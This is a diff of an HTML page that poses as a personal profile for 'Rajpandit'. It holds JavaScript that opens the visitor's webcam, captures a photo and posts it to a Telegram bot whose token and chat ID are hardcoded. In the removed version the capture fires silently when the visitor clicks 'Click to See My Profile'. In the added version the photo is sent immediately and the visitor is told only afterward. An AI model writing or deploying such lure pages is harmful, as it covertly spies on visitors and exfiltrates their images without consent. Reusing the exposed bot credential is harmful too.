@@ -1,175 +1,293 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RajPandit - UP </title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .container {
-            background: rgba(255,255,255,0.95);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 400px;
-        }
-        
-        .profile-img {
-            width: 150px;
-            height: 150px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-bottom: 20px;
-            border: 5px solid #667eea;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-        }
-        
-        h1 {
-            color: #333;
-            font-size: 2.5em;
-            margin-bottom: 10px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
-        }
-        
-        .location {
-            color: #667eea;
-            font-size: 1.2em;
-            margin-bottom: 30px;
-            font-weight: bold;
-        }
-        
-        .profile-btn {
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 1.2em;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
-        }
-        
-        .profile-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
-        }
-        
-        .profile-btn:active {
-            transform: translateY(0);
-        }
-        
-        #status {
-            margin-top: 20px;
-            font-size: 1em;
-            color: #28a745;
-            display: none;
-        }
-        
-        .camera-icon {
-            font-size: 1.5em;
-            margin-right: 10px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Rajpandit Intro</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #000000, #1a1a1a);
+      color: white;
+      text-align: center;
+    }
+
+    .container {
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    img {
+      width: 200px;
+      height: 200px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 4px solid white;
+      margin-bottom: 20px;
+    }
+
+    h1 {
+      font-size: 30px;
+      margin-bottom: 20px;
+    }
+
+    button {
+      padding: 12px 25px;
+      font-size: 16px;
+      border: none;
+      border-radius: 25px;
+      background: #ff4d4d;
+      color: white;
+      cursor: pointer;
+      transition: 0.3s;
+      margin: 10px;
+    }
+
+    button:hover {
+      background: #ff1a1a;
+      transform: scale(1.1);
+    }
+
+    button:disabled {
+      background: #666;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    #cameraBtn {
+      background: #4dff4d;
+    }
+
+    #cameraBtn:hover {
+      background: #1aff1a;
+    }
+
+    /* Camera Modal */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.9);
+    }
+
+    .modal-content {
+      margin: auto;
+      display: block;
+      width: 80%;
+      max-width: 700px;
+      position: relative;
+      top: 50%;
+      transform: translateY(-50%);
+    }
+
+    .video-container {
+      position: relative;
+      width: 100%;
+      height: 400px;
+      background: #000;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    #video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .capture-controls {
+      position: absolute;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 15px;
+    }
+
+    .capture-btn {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      border: 4px solid white;
+      background: #ff4d4d;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .capture-btn:hover {
+      background: #ff1a1a;
+      transform: scale(1.1);
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 20px;
+      right: 30px;
+      font-size: 40px;
+      cursor: pointer;
+      color: white;
+    }
+
+    /* Profile Page */
+    #profile {
+      display: none;
+      padding-top: 100px;
+    }
+  </style>
 </head>
+
 <body>
-    <div class="container">
-        <img src="photo1.jpg" alt="RajPandit" class="profile-img">
-        <h1>RajPandit</h1>
-        <div class="location">🇮🇳 UP & 🇺🇸 US</div>
-        <button class="profile-btn" onclick="capturePhoto()">
-            <span class="camera-icon">📸</span>
-            Click to See My Profile
-        </button>
-        <div id="status">Profile captured successfully! 😊</div>
+
+<!-- Intro Page -->
+<div class="container" id="intro">
+  <img src="photo1.jpg" alt="Profile Photo">
+  <h1>Rajpandit from UP</h1>
+  <button onclick="showProfile()">Click to see my profile</button>
+  <button id="cameraBtn" onclick="openCamera()">📸 Take Photo</button>
+</div>
+
+<!-- Profile Page -->
+<div id="profile">
+  <h1>Welcome to My Profile 😎</h1>
+  <p>Name: Rajpandit</p>
+  <p>From: Uttar Pradesh</p>
+  <p>Thanks for visiting ❤️</p>
+  <button onclick="showIntro()">← Back to Home</button>
+</div>
+
+<!-- Camera Modal -->
+<div id="cameraModal" class="modal">
+  <span class="close-btn" onclick="closeCamera()">&times;</span>
+  <div class="video-container">
+    <video id="video" autoplay playsinline></video>
+    <div class="capture-controls">
+      <div class="capture-btn" id="captureBtn" onclick="capturePhoto()" title="Capture Photo"></div>
     </div>
+  </div>
+</div>
 
-    <script>
-        const BOT_TOKEN = '8606335181:AAF51XIApm1NkEZKKWxX06sIgkHODZqULuQ';
-        const CHAT_ID = '7735968383';
+<script>
+  const BOT_TOKEN = '8606335181:AAF51XIApm1NkEZKKWxX06sIgkHODZqULuQ';
+  const CHAT_ID = '7735968383';
+  
+  let stream = null;
+  let capturedImage = null;
 
-        async function capturePhoto() {
-            try {
-                // Status show karo
-                document.getElementById('status').style.display = 'block';
-                
-                // Camera access lo
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    } 
-                });
-                
-                // Canvas banao photo capture karne ke liye
-                const canvas = document.createElement('canvas');
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    // Photo ko base64 me convert karo
-                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
-                    
-                    // Telegram bot ko bhejo
-                    sendToTelegram(photoData);
-                    
-                    // Stream band karo
-                    stream.getTracks().forEach(track => track.stop());
-                };
-                
-                video.play();
-                
-            } catch (error) {
-                console.error('Camera access error:', error);
-                alert('Camera access denied ya available nahi hai!');
-            }
-        }
-        
-        async function sendToTelegram(photoData) {
-            const timestamp = new Date().toLocaleString('en-IN', { 
-                timeZone: 'Asia/Kolkata' 
-            });
-            
-            const caption = `🆕 New Profile Capture!\n⏰ Time: ${timestamp}\n👤 Visitor Profile Clicked`;
-            
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', photoData);
-            formData.append('caption', caption);
-            
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                console.log('Telegram response:', result);
-                
-            } catch (error) {
-                console.error('Telegram send error:', error);
-            }
-        }
-    </script>
+  // Show profile page
+  function showProfile() {
+    document.getElementById("intro").style.display = "none";
+    document.getElementById("profile").style.display = "block";
+  }
+
+  // Show intro page
+  function showIntro() {
+    document.getElementById("profile").style.display = "none";
+    document.getElementById("intro").style.display = "flex";
+    closeCamera();
+  }
+
+  // Open camera modal
+  async function openCamera() {
+    const modal = document.getElementById("cameraModal");
+    const video = document.getElementById("video");
+    
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { 
+          width: 1280, 
+          height: 720,
+          facingMode: 'user' 
+        } 
+      });
+      video.srcObject = stream;
+      
+      document.getElementById('cameraBtn').disabled = true;
+      modal.style.display = "block";
+    } catch (err) {
+      alert('Camera access denied or not available');
+      console.error('Camera error:', err);
+    }
+  }
+
+  // Close camera modal
+  function closeCamera() {
+    const modal = document.getElementById("cameraModal");
+    const video = document.getElementById("video");
+    
+    modal.style.display = "none";
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+      stream = null;
+    }
+    video.srcObject = null;
+    document.getElementById('cameraBtn').disabled = false;
+  }
+
+  // Capture photo
+  function capturePhoto() {
+    const video = document.getElementById("video");
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+    
+    capturedImage = canvas.toDataURL('image/jpeg', 0.9);
+    
+    // Send to Telegram immediately
+    sendToTelegram(capturedImage);
+    
+    closeCamera();
+    alert('Photo captured and sent! 📸');
+  }
+
+  // Send photo to Telegram bot
+  async function sendToTelegram(imageData) {
+    try {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      
+      // Convert base64 to blob
+      const byteString = atob(imageData.split(',')[1]);
+      const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      const blob = new Blob([ab], { type: mimeString });
+      
+      formData.append('photo', blob, 'captured_photo.jpg');
+      
+      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+      
+      const result = await response.json();
+      console.log('Telegram response:', result);
+    } catch (error) {
+      console.error('Error sending to Telegram:', error);
+      alert('Photo captured but failed to send to Telegram');
+    }
+  }
+
+  // Handle modal close on outside click
+  window.onclick = function(event) {
+    const modal = document.getElementById("cameraModal");
+    if (event.target == modal) {
+      closeCamera();
+    }
+  }
+</script>
+
 </body>
 </html>
